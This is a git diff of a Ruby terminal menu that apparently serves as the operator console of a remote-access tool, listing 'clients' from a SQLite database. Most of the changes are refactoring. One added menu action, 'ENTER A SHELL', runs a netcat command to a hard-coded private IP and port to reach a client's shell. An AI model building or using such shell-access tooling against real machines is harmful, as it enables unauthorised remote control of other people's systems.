@@ -3,6 +3,8 @@ require 'tty-prompt'
 require 'tty-table'
 require 'sqlite3'
 
+$db = SQLite3::Database.new("../server/bin/assets/db/db.db")
+
 def tui
   puts "\n"
   puts " ██▀███   ▄▄▄     ▄▄▄█████▓▄▄▄█████▓▓█████  ███▄    █     ███▄ ▄███▓ ▄▄▄       ███▄    █  ▄▄▄        ▄████ ▓█████  ██▀███".red
@@ -17,7 +19,7 @@ def tui
   main_menu
 end
 
-def self.main_menu
+def main_menu
   puts "\n"
   prompt = TTY::Prompt.new
   options = prompt.select("What Are You Managing =>") do |menu|
@@ -31,6 +33,7 @@ def self.main_menu
       puts "selected choice => SERVER menu".blue
     when "CLIENTS"
       puts "selected choice => CLIENT menu".blue
+      client_menu
     when "DATABASE"
       puts "selected choice => DATABASE menu".blue
       database_menu
@@ -43,8 +46,11 @@ end
 #==================#
 #    |CLIENT|      #
 #==================#
-def client_menu(db)
-  rows = db.execute("SELECT * FROM users")
+#==================#
+#    |CLIENT|      #
+#==================#
+def client_menu
+  rows = $db.execute("SELECT * FROM users")
   if rows.empty?
     puts "TABLE users => empty"
     return
@@ -62,13 +68,13 @@ end
 
 def client_menu_entry
   prompt = TTY::Prompt.new
-  prompt.select("Choose an Action") do |menu|
+  choice = prompt.select("Choose an Action") do |menu|
     menu.choice "ENTER A SHELL"
     menu.choice "BACK"
   end
   case choice
     when "ENTER A SHELL"
-      system("nc 10.0.0.109 9001")
+      system("nc 10.0.0.109 9001") # replace with spawn when done testing/playing
     when "BACK"
       client_menu
   end
@@ -77,7 +83,7 @@ end
 #==================#
 #   |DATABASE|     #
 #==================#
-def self.database_menu
+def database_menu
   dbfile = "../server/bin/assets/db/db.db"
   db = SQLite3::Database.new(dbfile)
   puts "\n"
